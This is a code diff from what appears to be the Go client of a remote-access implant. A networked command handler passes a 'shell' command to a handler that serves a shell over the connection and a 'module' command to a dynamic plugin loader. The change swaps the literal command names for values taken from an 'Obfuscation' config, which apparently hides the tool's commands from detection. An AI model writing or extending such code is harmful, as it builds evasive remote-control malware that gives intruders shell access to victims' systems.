@@ -6,6 +6,7 @@ import (
 	"fmt"
 	"net"
 	"src/Client/generic/commands"
+	"src/Client/generic/config"
 	"src/Client/generic/logger"
 	"src/Client/generic/rpc_client"
 	"src/Client/session/protocol"
@@ -63,11 +64,11 @@ func processCommand(conn net.Conn, command string) error {
 
 	// Handle built-in and dynamic commands
 	switch cmdName {
-	case "shell":
+	case config.Obfuscation.Generic.Commands.Shell.Name:
 		logger.Log("Received shell command, executing shell handler.")
 		commands.ShellHandler(conn)
 		return nil
-	case "module":
+	case config.Obfuscation.Generic.Commands.Module.Name:
 		logger.Log("Received module command, loading dynamic plugin.")
 		var moduleData struct {
 			Name string `json:"name"`
